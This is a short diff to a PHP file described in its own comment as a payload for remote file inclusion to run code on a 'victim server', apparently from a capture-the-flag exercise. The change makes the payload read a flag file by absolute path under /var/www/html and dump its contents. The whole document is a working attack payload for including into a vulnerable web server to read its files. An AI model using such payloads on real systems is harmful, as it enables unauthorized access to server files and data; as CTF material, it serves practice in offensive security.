@@ -1,4 +1,5 @@
 <?php
 // This file is used for rfi to run code on the victim server
-echo file_get_contents("i_wonder_whats_in_here/flag.php");
+$data = file_get_contents("/var/www/html/i_wonder_whats_in_here/flag.php");
+var_dump($data)
 ?>
